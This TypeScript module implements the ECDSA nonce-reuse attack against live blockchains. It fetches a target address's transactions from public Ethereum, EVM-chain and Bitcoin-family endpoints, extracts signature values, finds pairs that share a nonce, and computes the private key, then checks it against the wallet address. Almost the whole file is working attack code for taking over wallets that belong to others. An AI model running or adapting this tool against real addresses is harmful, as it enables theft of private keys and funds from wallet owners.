// ECDSA Nonce Reuse Private Key Recovery
// Mathematical implementation of the k-reuse attack on secp256k1
// Real-world precedent: Sony PS3 (2010), Bitcoin weak-RNG wallets (2012-2013)
//
// How it works: In ECDSA, r = (k·G).x mod n
// If the same k is used twice: r1 === r2 (same x-coordinate)
// Given two signatures with the same r, algebra recovers k, then the private key.

import { ethers } from "ethers";

// secp256k1 curve order (n)
const CURVE_N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");

// Public RPC endpoints
const ETH_RPC = "https://cloudflare-eth.com";
const ETHERSCAN_API = "https://api.etherscan.io/api";

// ── Modular arithmetic helpers ────────────────────────────────────────────────

function modN(x: bigint): bigint {
  return ((x % CURVE_N) + CURVE_N) % CURVE_N;
}

// Extended Euclidean Algorithm — modular inverse mod n
function modInverse(a: bigint, m: bigint): bigint {
  let [oldR, r] = [((a % m) + m) % m, m];
  let [oldS, s] = [1n, 0n];
  while (r !== 0n) {
    const q = oldR / r;
    [oldR, r] = [r, oldR - q * r];
    [oldS, s] = [s, oldS - q * s];
  }
  if (oldR !== 1n) throw new Error("No modular inverse — values are not coprime");
  return ((oldS % m) + m) % m;
}

// ── Core recovery math ────────────────────────────────────────────────────────

export interface RecoveryInput {
  r: string;   // hex, shared r value (proves same k)
  s1: string;  // hex, s from first signature
  s2: string;  // hex, s from second signature
  z1: string;  // hex, message hash (signed digest) of first tx
  z2: string;  // hex, message hash (signed digest) of second tx
  txHash1: string;
  txHash2: string;
  address: string;
}

export interface RecoveryResult {
  success: boolean;
  privateKey: string | null;
  nonceK: string | null;
  derivedAddress: string | null;
  addressMatches: boolean;
  error: string | null;
  math: RecoveryMath;
}

export interface RecoveryMath {
  step1_numerator: string;
  step1_denominator: string;
  step2_k: string;
  step3_privateKey: string;
  verification: string;
}

export function recoverPrivateKey(input: RecoveryInput): RecoveryResult {
  try {
    const r  = BigInt(input.r);
    const s1 = BigInt(input.s1);
    const s2 = BigInt(input.s2);
    const z1 = BigInt(input.z1);
    const z2 = BigInt(input.z2);

    // Step 1: Recover nonce k
    // k = (z1 - z2) · (s1 - s2)⁻¹  mod n
    const num = modN(z1 - z2);
    const den = modN(s1 - s2);

    if (den === 0n) {
      return { success: false, privateKey: null, nonceK: null, derivedAddress: null, addressMatches: false, error: "s1 === s2 — signatures are identical, not a nonce reuse case", math: { step1_numerator: "0", step1_denominator: "0", step2_k: "0", step3_privateKey: "0", verification: "failed" } };
    }

    const denInv = modInverse(den, CURVE_N);
    const k = (num * denInv) % CURVE_N;

    if (k === 0n) {
      return { success: false, privateKey: null, nonceK: null, derivedAddress: null, addressMatches: false, error: "Recovered k = 0 — invalid result", math: { step1_numerator: num.toString(16), step1_denominator: den.toString(16), step2_k: "0", step3_privateKey: "0", verification: "failed" } };
    }

    // Step 2: Recover private key d
    // d = (s1·k - z1) · r⁻¹  mod n
    const rInv = modInverse(r, CURVE_N);
    const d = modN(modN(s1 * k) - z1) * rInv % CURVE_N;

    if (d === 0n) {
      return { success: false, privateKey: null, nonceK: null, derivedAddress: null, addressMatches: false, error: "Recovered d = 0 — invalid result", math: { step1_numerator: num.toString(16), step1_denominator: den.toString(16), step2_k: k.toString(16), step3_privateKey: "0", verification: "failed" } };
    }

    // Step 3: Derive Ethereum address from recovered private key
    const privKeyHex = "0x" + d.toString(16).padStart(64, "0");
    let derivedAddress: string | null = null;
    let addressMatches = false;

    try {
      const wallet = new ethers.Wallet(privKeyHex);
      derivedAddress = wallet.address;
      addressMatches = derivedAddress.toLowerCase() === input.address.toLowerCase();
    } catch {}

    return {
      success: true,
      privateKey: privKeyHex,
      nonceK: "0x" + k.toString(16).padStart(64, "0"),
      derivedAddress,
      addressMatches,
      error: null,
      math: {
        step1_numerator: "0x" + num.toString(16),
        step1_denominator: "0x" + den.toString(16),
        step2_k: "0x" + k.toString(16).padStart(64, "0"),
        step3_privateKey: privKeyHex,
        verification: addressMatches
          ? `✓ Derived address ${derivedAddress} MATCHES target ${input.address}`
          : `✗ Derived address ${derivedAddress} does not match ${input.address} — nonce reuse exists but at a different address in tx chain`,
      },
    };
  } catch (err) {
    return {
      success: false, privateKey: null, nonceK: null, derivedAddress: null, addressMatches: false,
      error: String(err),
      math: { step1_numerator: "N/A", step1_denominator: "N/A", step2_k: "N/A", step3_privateKey: "N/A", verification: "failed" },
    };
  }
}

// ── Chain capability definitions ──────────────────────────────────────────────

export interface ChainCapability {
  chain: string;
  name: string;
  sigScheme: "secp256k1-ecdsa" | "ed25519" | "clsag" | "schnorr";
  nonceReuseVulnerable: boolean;
  note: string;
  canScan: boolean;
}

export const CHAIN_CAPABILITIES: ChainCapability[] = [
  { chain: "ethereum",    name: "Ethereum (ETH)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — extracts r, s, z from every transaction" },
  { chain: "polygon",     name: "Polygon (MATIC)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "bsc",         name: "BNB Chain (BSC)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "arbitrum",    name: "Arbitrum (ARB)",       sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "avalanche",   name: "Avalanche (AVAX)",     sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "optimism",    name: "Optimism (OP)",        sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Full scan — same ECDSA as Ethereum" },
  { chain: "bitcoin",     name: "Bitcoin (BTC)",        sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Parses DER signatures from scriptSig and witness data" },
  { chain: "litecoin",    name: "Litecoin (LTC)",       sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same secp256k1 ECDSA as Bitcoin — full scan" },
  { chain: "dogecoin",    name: "Dogecoin (DOGE)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same secp256k1 ECDSA as Bitcoin — full scan" },
  { chain: "bitcoincash", name: "Bitcoin Cash (BCH)",   sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same secp256k1 ECDSA as Bitcoin — full scan" },
  { chain: "solana",      name: "Solana (SOL)",         sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Ed25519 uses RFC 8032 deterministic nonce generation — nonce reuse is cryptographically impossible by design. Each nonce is derived as H(private_key || message), so two different messages always produce different nonces." },
  { chain: "monero",      name: "Monero (XMR)",         sigScheme: "clsag",            nonceReuseVulnerable: false, canScan: false, note: "CLSAG ring signatures use a different structure than ECDSA — there is no exposed r value to match across transactions. Monero's quantum vulnerabilities are in ECDLP on Curve25519, not nonce reuse." },
  { chain: "cardano",     name: "Cardano (ADA)",        sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Ed25519 deterministic signatures — same immunity as Solana. Nonce reuse is impossible by the signing algorithm." },
  { chain: "polkadot",    name: "Polkadot (DOT)",       sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Sr25519 (Schnorr/Ristretto) with deterministic nonces — not vulnerable to nonce reuse attack." },
];

// ── Transaction signature extraction ─────────────────────────────────────────

export interface TxSignatureData {
  txHash: string;
  blockNumber: number;
  from: string;
  to: string | null;
  value: string;
  r: string;
  s: string;
  v: number;
  z: string;  // signed message hash (preimage)
  nonce: number;
  gasPrice: string;
}

export interface NonceReusePair {
  sharedR: string;
  tx1: TxSignatureData;
  tx2: TxSignatureData;
  riskLevel: "confirmed_reuse" | "same_k_different_s";
}

export interface WalletScanResult {
  address: string;
  chain: string;
  totalTransactions: number;
  signaturesExtracted: number;
  nonceReusePairs: NonceReusePair[];
  hasVulnerability: boolean;
  allSignatures: TxSignatureData[];
  scanTimestamp: string;
  rPairs: Record<string, string[]>; // r value -> [txHash1, txHash2, ...]
}

export async function scanWalletForNonceReuse(address: string, chain = "ethereum"): Promise<WalletScanResult> {
  // Route UTXO chains to Bitcoin scanner
  const utxoChains = ["bitcoin", "litecoin", "dogecoin", "bitcoincash"];
  if (utxoChains.includes(chain)) {
    const { scanBitcoinAddressECDSA } = await import("./bitcoin-scan");
    const result = await scanBitcoinAddressECDSA(address, chain);
    return buildScanResult(address, chain, result.signatures, result.totalTransactions);
  }

  // EVM chains go through ethers.js
  const evmChains = ["ethereum", "polygon", "bsc", "arbitrum", "avalanche", "optimism"];
  const rpcEndpoints: Record<string, string> = {
    ethereum: "https://cloudflare-eth.com",
    polygon:  "https://polygon-rpc.com",
    bsc:      "https://bsc-dataseed.binance.org",
    arbitrum: "https://arb1.arbitrum.io/rpc",
    avalanche:"https://api.avax.network/ext/bc/C/rpc",
    optimism: "https://mainnet.optimism.io",
  };
  const etherscanBases: Record<string, string> = {
    ethereum: "https://api.etherscan.io/api",
    polygon:  "https://api.polygonscan.com/api",
    bsc:      "https://api.bscscan.com/api",
    arbitrum: "https://api.arbiscan.io/api",
    avalanche:"https://api.snowtrace.io/api",
    optimism: "https://api-optimistic.etherscan.io/api",
  };
  if (!evmChains.includes(chain)) {
    throw new Error(`Chain "${chain}" does not use secp256k1 ECDSA and cannot be scanned for nonce reuse`);
  }
  // Use the chain-specific RPC and explorer
  return _scanEVMWallet(address, chain, rpcEndpoints[chain] ?? rpcEndpoints.ethereum, etherscanBases[chain] ?? etherscanBases.ethereum);
}

function buildScanResult(address: string, chain: string, signatures: TxSignatureData[], totalTxCount: number): WalletScanResult {
  const rGroups: Record<string, TxSignatureData[]> = {};
  for (const sig of signatures) {
    const rKey = sig.r.toLowerCase();
    if (!rGroups[rKey]) rGroups[rKey] = [];
    rGroups[rKey].push(sig);
  }
  const nonceReusePairs: NonceReusePair[] = [];
  const rPairs: Record<string, string[]> = {};
  for (const [r, group] of Object.entries(rGroups)) {
    if (group.length >= 2) {
      rPairs[r] = group.map(g => g.txHash);
      for (let i = 0; i < group.length; i++) {
        for (let j = i + 1; j < group.length; j++) {
          nonceReusePairs.push({ sharedR: r, tx1: group[i], tx2: group[j], riskLevel: group[i].s !== group[j].s ? "confirmed_reuse" : "same_k_different_s" });
        }
      }
    }
  }
  return { address, chain, totalTransactions: totalTxCount, signaturesExtracted: signatures.length, nonceReusePairs, hasVulnerability: nonceReusePairs.length > 0, allSignatures: signatures, scanTimestamp: new Date().toISOString(), rPairs };
}

async function _scanEVMWallet(address: string, chain: string, rpcUrl: string, etherscanBase: string): Promise<WalletScanResult> {
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const checksum = ethers.getAddress(address);

  // Fetch transaction list from Etherscan (no key — rate limited but functional)
  let txHashes: string[] = [];
  try {
    const url = `${ETHERSCAN_API}?module=account&action=txlist&address=${checksum}&startblock=0&endblock=99999999&page=1&offset=50&sort=asc&apikey=YourApiKeyToken`;
    const r = await fetch(url, { signal: AbortSignal.timeout(12000) });
    const json = await r.json() as Record<string, unknown>;
    const txs = (json.result as Record<string, unknown>[]) ?? [];
    // Only include transactions SENT by this address (from === address)
    txHashes = txs
      .filter(tx => String(tx.from ?? "").toLowerCase() === checksum.toLowerCase())
      .map(tx => String(tx.hash));
  } catch {}

  // Fetch full transaction data to extract v, r, s, and compute signed hash z
  const signatures: TxSignatureData[] = [];

  for (const hash of txHashes.slice(0, 40)) {
    try {
      const tx = await provider.getTransaction(hash);
      if (!tx || !tx.signature) continue;

      const sig = tx.signature;

      // Compute the signed message hash (z) — the hash ECDSA was applied to
      let z = "0x" + "0".repeat(64);
      try {
        const unsignedTx = ethers.Transaction.from({
          to: tx.to,
          nonce: tx.nonce,
          gasLimit: tx.gasLimit,
          gasPrice: tx.gasPrice ?? tx.maxFeePerGas,
          data: tx.data,
          value: tx.value,
          chainId: tx.chainId,
          maxFeePerGas: tx.maxFeePerGas,
          maxPriorityFeePerGas: tx.maxPriorityFeePerGas,
          type: tx.type,
          accessList: tx.accessList,
        });
        z = ethers.keccak256(unsignedTx.unsignedSerialized);
      } catch {}

      signatures.push({
        txHash: hash,
        blockNumber: tx.blockNumber ?? 0,
        from: tx.from ?? "",
        to: tx.to ?? null,
        value: ethers.formatEther(tx.value),
        r: sig.r,
        s: sig.s,
        v: sig.v,
        z,
        nonce: tx.nonce,
        gasPrice: tx.gasPrice?.toString() ?? "0",
      });
    } catch {}
  }

  // Group signatures by r value — matching r means same k (nonce) was used
  const rGroups: Record<string, TxSignatureData[]> = {};
  for (const sig of signatures) {
    const rKey = sig.r.toLowerCase();
    if (!rGroups[rKey]) rGroups[rKey] = [];
    rGroups[rKey].push(sig);
  }

  // Find nonce reuse pairs
  const nonceReusePairs: NonceReusePair[] = [];
  const rPairs: Record<string, string[]> = {};

  for (const [r, group] of Object.entries(rGroups)) {
    if (group.length >= 2) {
      rPairs[r] = group.map(g => g.txHash);
      // Generate all pairs
      for (let i = 0; i < group.length; i++) {
        for (let j = i + 1; j < group.length; j++) {
          nonceReusePairs.push({
            sharedR: r,
            tx1: group[i],
            tx2: group[j],
            riskLevel: group[i].s !== group[j].s ? "confirmed_reuse" : "same_k_different_s",
          });
        }
      }
    }
  }

  return {
    address: checksum,
    chain: "ethereum",
    totalTransactions: txHashes.length,
    signaturesExtracted: signatures.length,
    nonceReusePairs,
    hasVulnerability: nonceReusePairs.length > 0,
    allSignatures: signatures,
    scanTimestamp: new Date().toISOString(),
    rPairs,
  };
}
